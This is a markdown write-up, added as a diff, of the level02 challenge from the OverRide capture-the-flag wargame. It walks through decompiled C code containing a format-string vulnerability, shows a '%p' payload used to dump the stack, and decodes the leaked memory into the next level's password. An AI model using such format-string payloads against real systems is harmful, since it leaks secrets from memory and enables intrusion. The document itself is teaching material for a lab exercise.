@@ -1,0 +1,88 @@
+Upon login we're greeted by the usual information:
+
+```shell
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   /home/users/level02/level02
+```
+
+There is a SUID binary owned by `level03` which prompts for a username, which we don't have. Let's look at the decompiled code:
+
+```C
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char s2[96]; // [rsp+10h] [rbp-110h] BYREF
+  int v5; // [rsp+70h] [rbp-B0h]
+  char ptr[48]; // [rsp+80h] [rbp-A0h] BYREF
+  char s[96]; // [rsp+B0h] [rbp-70h] BYREF
+  int v8; // [rsp+110h] [rbp-10h]
+  int v9; // [rsp+114h] [rbp-Ch]
+  FILE *stream; // [rsp+118h] [rbp-8h]
+
+  memset(s, 0, sizeof(s));
+  v8 = 0;
+  memset(ptr, 0, 41);
+  memset(s2, 0, sizeof(s2));
+  v5 = 0;
+  stream = 0LL;
+  v9 = 0;
+  stream = fopen("/home/users/level03/.pass", "r");
+  if ( !stream )
+  {
+    fwrite("ERROR: failed to open password file\n", 1uLL, 0x24uLL, stderr);
+    exit(1);
+  }
+  v9 = fread(ptr, 1uLL, 0x29uLL, stream);
+  ptr[strcspn(ptr, "\n")] = 0;
+  if ( v9 != 41 )
+  {
+    fwrite("ERROR: failed to read password file\n", 1uLL, 0x24uLL, stderr);
+    fwrite("ERROR: failed to read password file\n", 1uLL, 0x24uLL, stderr);
+    exit(1);
+  }
+  fclose(stream);
+  puts("===== [ Secure Access System v1.0 ] =====");
+  puts("/***************************************\\");
+  puts("| You must login to access this system. |");
+  puts("\\**************************************/");
+  printf("--[ Username: ");
+  fgets(s, 100, stdin);
+  s[strcspn(s, "\n")] = 0;
+  printf("--[ Password: ");
+  fgets(s2, 100, stdin);
+  s2[strcspn(s2, "\n")] = 0;
+  puts("*****************************************");
+  if ( strncmp(ptr, s2, 0x29uLL) )
+  {
+    printf(s);
+    puts(" does not have access!");
+    exit(1);
+  }
+  printf("Greetings, %s!\n", s);
+  system("/bin/sh");
+  return 0;
+}
+```
+
+There is a `printf` that directly uses a variable, which is vulnerable to a string format attack. With this we should be able to read the contents of ptr, which has copied the contents of the **.pass** file. Let's dump the stack:
+
+```shell
+level02@OverRide:~$ ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
+--[ Password: *****************************************
+0x7fffffffe4e0 (nil) 0x25 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6d8 0x2f7ff9a08 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x100207025 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
+```
+
+By going through the values we can see where the contents of `ptr` are:
+
+0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d
+
+Now we only need to convert them into little endian and ASCII. This can be done through multiple websites [[1]](https://gchq.github.io/CyberChef/)
+
+
+![](https://cdn.discordapp.com/attachments/833692533162901504/1141423157601914900/image.png)
+
+This gives us the password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
